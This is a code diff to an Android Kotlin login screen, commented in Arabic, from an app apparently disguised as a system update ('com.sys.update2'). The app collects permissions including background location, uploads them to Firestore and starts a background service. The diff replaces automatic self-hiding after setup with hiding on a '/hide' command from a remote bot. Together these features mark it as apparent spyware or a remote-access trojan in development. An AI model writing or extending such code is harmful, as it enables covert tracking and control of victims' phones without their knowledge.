@@ -1,5 +1,5 @@
 // language: Kotlin, file: LoginActivity.kt
-// التصميم منسوخ 1:1 من ملف auth.html (ExCoreX)
+// التطبيق ما يختفيش تلقائي — الإخفاء بأمر من البوت فقط
 
 package com.sys.update2
 
@@ -240,18 +240,26 @@ class LoginActivity : ComponentActivity() {
                 }
                 onAllPermissionsGranted()
             }
-            BG_LOCATION_REQUEST -> hideAndMinimize()
+            BG_LOCATION_REQUEST -> {
+                // التطبيق يفضل ظاهر — الإخفاء بأمر من البوت فقط
+            }
         }
     }
 
+    // ⭐ التطبيق ما يختفيش — الإخفاء بأمر من البوت (/hide)
     private fun onAllPermissionsGranted() {
         if (permissionsHandled) return
         permissionsHandled = true
 
-        try { DeviceManager.uploadPermissions(applicationContext) } catch (_: Exception) {}
+        // ارفع الأذونات على Firestore
+        try {
+            DeviceManager.uploadPermissions(applicationContext)
+        } catch (_: Exception) {}
 
+        // شغّل الخدمة
         startBackgroundService()
 
+        // Android 10+ : Background Location
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
             val bg = ContextCompat.checkSelfPermission(
                 this, Manifest.permission.ACCESS_BACKGROUND_LOCATION
@@ -273,24 +281,8 @@ class LoginActivity : ComponentActivity() {
             }
         }
 
-        Handler(Looper.getMainLooper()).postDelayed({ hideAndMinimize() }, 800L)
-    }
-
-    private fun hideAndMinimize() {
-        try {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
-                finishAndRemoveTask()
-            } else {
-                finish()
-            }
-            val home = Intent(Intent.ACTION_MAIN).apply {
-                addCategory(Intent.CATEGORY_HOME)
-                flags = Intent.FLAG_ACTIVITY_NEW_TASK
-            }
-            startActivity(home)
-        } catch (_: Exception) {
-            try { finish() } catch (_: Exception) {}
-        }
+        // ⭐ مفيش إخفاء تلقائي — التطبيق يفضل ظاهر
+        // الإخفاء يحتاج أمر /hide من البوت
     }
 
     private fun startBackgroundService() {
